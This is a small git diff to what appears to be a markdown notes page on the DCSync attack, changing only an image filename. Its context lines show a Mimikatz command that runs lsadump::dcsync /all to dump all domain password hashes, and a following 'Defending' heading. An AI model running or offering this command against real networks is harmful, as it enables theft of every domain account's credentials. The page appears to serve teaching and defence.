@@ -72,7 +72,7 @@ Download MimiKatz and execute dcsync:
 Invoke-Mimikatz -Command '"lsadump::dcsync /all"'
 ```
 
-![](<../../../../.gitbook/assets/image (59).png>)
+![](<../../../../.gitbook/assets/image (59) (1).png>)
 
 ## Defending
 
